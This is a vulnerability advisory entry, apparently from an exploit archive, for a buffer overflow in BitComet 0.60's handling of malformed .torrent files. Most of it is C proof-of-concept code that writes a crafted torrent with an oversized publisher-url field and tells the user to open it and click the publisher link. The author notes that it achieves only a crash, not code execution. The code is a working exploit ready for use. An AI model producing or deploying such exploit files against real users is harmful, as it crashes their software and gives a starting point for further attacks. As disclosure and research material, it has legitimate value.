source: http://www.securityfocus.com/bid/16311/info

BitComet is prone to a buffer-overflow vulnerability.

This issue presents itself when the application attempts to process a malformed '.torrent' file.

Exploitation of this issue could allow attacker-supplied machine code to be executed in the context of the affected application.

BitComet 0.60 is reportedly vulnerable. Other versions may be affected as well. 

#include <windows.h>
#include <stdio.h>

/*
* .::[ BitComet URI Buffer Overflow ]::.
*
* A vulnerability in BitComet, allows remote attackers construct a special .torrent file and put
* it on any BitTorrent publishing web site. When a user downloads the .torrent file and clicks
* on publishers name, BitComet will crash. An attacker can run arbitrary code on victims' host
* by specially crafted .torrent file.
*
* .text:0056057B                 mov     edx, [eax]
* .text:0056057D                 push    0
* .text:0056057F                 push    esi
* .text:00560580                 mov     ecx, eax
* .text:00560582                 call    dword ptr [edx+9Ch] <--- bug occurs here
*
* [Credits]: Fortinet Research
* [Notes]:      I could only do DoS because the EAX and ECX were only controlled, and were seperated by 0's.
*/

char bof[] =
        "d8:announce15:http://test.com"
        "7:comment4:1234"
        "13:comment.utf-84:1234"
        "10:created by13:BitComet/0.60"
        "13:creation datei1137897500e"
        "8:encoding5:UTF-84:info"
        "d6:lengthi0e"
        "4:name8:null.txt"
        "10:name.utf-88:null.txt"
        "12:piece lengthi32768e"
        "6:pieces20:\xDA\x39\xA3\xEE\x5E\x6B\x4B\x0D\x32\x55\xBF\xEF\x95\x60\x18\x90\xAF\xD8\x07\x09"
        "9:publisher4:test"
        "13:publisher-url19:http://www.test.com"
        "19:publisher-url.utf-8";

char eof[] =
        "e5:nodesll15:213.112.235.171"
        "i31225eel14:210.49.100.112"
        "i32459eel14:61.229.130.217"
        "i17550eel14:200.88.148.239"
        "i61154eel14:222.84.178.235"
        "i17581eel14:220.210.178.80"
        "i11385eel12:218.7.239.78"
        "i50468eel12:130.158.6.55"
        "i62093eel13:219.68.237.54"
        "i26034eel12:82.83.53.230"
        "i7836eeee";

int main(int argc, char **argv) {
        FILE *fp;
        char buf[2048];

        printf("+---=[ BitComet URI Buffer Overflow ]=---+\n");
        printf("+---=[ Coded by DiGiTALSTAR ]=---+\n\n");

        printf("Opening torrent for writing... ");
        if (!(fp = fopen("comet.torrent", "w"))) {
                printf("FAILED\n");
                exit(-1);
        }
        printf("OK");

        memset(buf, '\x41', sizeof(buf));

        printf("Writing torrent data... ");
        if (fwrite(bof, 1, sizeof(bof)-1, fp) <= 0) {
                printf("FAILED\n");
                exit(-1);
        }
        if (fprintf(fp, "%d:", sizeof(buf)) <= 0) {
                printf("FAILED\n");
                exit(-1);
        }
        if (fwrite(buf, 1, sizeof(buf), fp) <= 0) {
                printf("FAILED\n");
                exit(-1);
        }
        if (fwrite(eof, 1, sizeof(eof)-1, fp) <= 0) {
                printf("FAILED\n");
                exit(-1);
        }
        printf("DONE\n");

        fclose(fp);

        printf("Now open the torrent in bitcomet and click test\n");

        return 0;
}